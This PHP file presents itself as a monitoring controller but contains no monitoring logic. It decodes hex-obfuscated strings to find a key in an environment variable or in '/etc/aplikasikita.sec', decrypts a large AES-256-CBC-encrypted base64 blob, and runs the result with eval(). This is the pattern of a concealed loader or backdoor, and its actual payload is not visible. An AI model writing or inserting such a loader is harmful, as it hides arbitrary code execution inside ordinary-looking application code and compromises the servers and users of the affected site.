<?php
namespace App\Http\Controllers\Monitoring;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('4bL5x+kJkNgLuuCVdC1y7g==');

$c=base64_decode(

'0YRLV4e4fG2d6k0TydACffY1sbS8lkJPXrROX5Iu0aZbyjuXxtWXNsG4fOhnEqeeN5a+J8E/hULD' .
'7q4Gsx4ln4OOoJ+XVlLWqx+vwLQJ0Ju/aog3r5PxeiETLN6bMjAG75u/TgjexgG+w/8DJi4FKYh6' .
'lGt75RI4E+kQOwUwkXjEyDN0edG2sMyL0qVgSApCx+m2zyqd+UE7E0tZoWV6iKWY+tBB1ygDjC8x' .
'IyhYxDtdDKB3jMEkGLN17H8Hl/fe4yRtgZ57moDrv7ar5CgfMJx0qT5H+t72bLS0lceIRDmBPDXx' .
'aEFPBKUnW7d3WieXoqSLflk6M2u5hZbT5SAT9V54opMdqrD+dTcNNyLGVjd3xXHnQxh3Vof1Gwm2' .
'wSkfFTmsYh7pGU4UfM7wmfwwGovOoAQ/XUsWjpYNV0MyQ9EA6vyHSJ2Oska4ZJS1BtgITjPwv4EC' .
'mSLJjYio5ruRRhbnvZtn1429fbp6Xh83Jv1G/z7BO1nbfBU4Rvu/PZXAKSOiE8E6CWmgSo5eQEzL' .
'RaYAOp6w5+jchaFP76FVve7Tlf7y0BwoRNolTvf8qNR6VXO5/S0DBvjAnegiQDQKBYnc9Cz8IGe2' .
'/IQR75faUMaBX1rOsBExDKXsoZQuiAw+u38R+KDZLaz8GOqZrKQQFNHqjzwmu5QQrBlfIHpaLRuX' .
'24Dm4xX6Rd3GLHA/ZJ5rKb4/lj5ex51cYs2IsoduUT5EEsIbJQn0syDLx55yh4kdzEvDBmsqavqz' .
'61ew5OyLT4zGaOV8ipuc0Itljf4TJtYSlggQdehR1UvqLny0Fiw+qLJgIfKgVoSP4AKW9lsMV9RJ' .
'uaSzzz7pYHhhuBG5VrzKD/p8O2eUtb9ac6FRWKCeey0LiKxIAPXSs4ITbRkkKFTv/wUXSc0WYzPu' .
'Nc3rtN1Qsi6n5VLEPFTqgJJJEybIqre33NSZH1mHuv1NWkiJ5wVwwe0SEVmsv3gqJ19dGIT1yPO+' .
'NsaN9QQm+Y9mjKCLpuXsSLHI2SJ831JCm0ezYFO9WWdNGiNJDcU5bWirdCtsndDc9csX1CBGi1nF' .
'iZtM9ZviGcVh1iXXc462raqskschDMpxVUuVodARJxhZF2NOh96bpfXKWBglnwLm9vhI1MLC2m8u' .
'9sjQY7SFYr7+1kkur7AsO7oYkVE6BQT/UQqW87oTo6eOAi1En+q8LGNqpSG8B35i6GL+/rUuCfy3' .
'wo1YNukgRDD29JdobQji8gJ5LUOu1ZU5xxRp2fPS2fPNlj/cWKmGchsI84358QnTLB8nP9PzlNtp' .
'oz1ZxYL0QYZBnlLBjAGtwVC+GVni6/jmGWxSYMVLRBPkUEwwHIcKGw+7LSRu1FQ8bzmEjadG6eVj' .
'hjzd64QfCIQfC5T1h9oJHOLtKr+y8NzANiJPOsmiqK1NXjaE5aHavG0ClsN3dslfJH1UqK3Sp9DA' .
'jN0iaCdNNCjnaMK4sPnixhrAbuioO916eCAos2GEVEB4y9JDI2MV2lyRxndEy+ZtnLG0E0ncLnmG' .
'w6Yz0TjUNCbQB0hz8L3N6d2PtMwgmFkUN1tUdUOGVJcyFk2t3o7zSTMGG3QOXehPsW5pkl6L1/Aj' .
'5oZ1s9udo5AIzJpRN8/hz7CV28XrmlfshKOoZSJ0wb5qBdrMh81xMgmN8+8CYxxpwdyeCUPgAf9X' .
'KO/8bWBdhP/s3row6TjqX7+eDCRnZ7qOVobDwqMFtV9cutbrc9mrgJgr'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

